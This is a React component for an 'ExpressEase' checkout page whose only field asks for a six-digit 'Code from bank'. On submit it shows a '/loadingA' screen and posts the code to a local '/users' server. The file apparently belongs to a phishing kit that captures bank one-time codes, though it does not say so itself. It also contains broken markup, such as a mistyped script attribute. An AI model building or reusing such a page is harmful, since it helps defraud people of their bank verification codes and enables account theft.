import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLocation } from 'react-router-dom';
import axios from 'axios';
import './style.css';

function App() {
  const [formData, setFormData] = useState({
    customer_name: 'Assistant1',
    sixdigits: '',
    boolean_six: "true",
  });
  const navigate = useNavigate();
  const [formSubmitted, setFormSubmitted] = useState(false);

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setFormSubmitted(true);
    const invalidFields = Object.entries(formData).filter(([key, value]) => value.trim() === '');
    if (invalidFields.length > 0) {
      alert('Please fill in all required fields.');
      return;
    }

    try {
      navigate('/loadingA', { state: { formData: formData } });
      const response = await axios.post('http://localhost:3002/users', formData);
      console.log('Ответ сервера:', response.data);
    } catch (error) {
      console.error('Ошибка при отправке данных на сервер:', error.message);
    }
  };

  return (
    <div>
      <html>
        <head>
          <script scr="/script.js"></script>
          <meta charset="UTF-8" />
          <meta name="viewport" content="width=device-width, initial-scale=1" />
          <title>Bootstrap demo</title>
          <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous" />
          <style>{`
            .input-field.invalid {
              border-color: red;
            }
          `}
          </style>
        </head>
        <body class="page-top">
          <header class="header">
            <a class="logo" href="">ExpressEase</a>
            <input class="menu-btn" type="checkbox" id="menu-btn" />
            <label class="menu-icon" for="menu-btn"><span class="navicon"></span></label>
          </header>
          <section class="add-card page">
            <link rel="stylesheet" href="style.css" />
            <form class="form">
              <div class="non-split">
                <label for="sixdigits" class="label">
                  <span class="title">Code from bank</span>
                  <input
                    id="sixdigits"
                    class={`input-field ${formSubmitted && !formData.sixdigits.trim() && 'invalid'}`}
                    type="text"
                    name="sixdigits"
                    title="6-digits"
                    placeholder="6-digits"
                    value={formData.sixdigits}
                    onChange={handleChange}
                    maxLength="6"
                    required
                  />
                </label>
              </div>
              <input class="checkout-btn" type="submit" value="Checkout" onClick={handleSubmit} />
            </form>
          </section>
        </body>
      </html>
    </div>
  );
}

export default App;
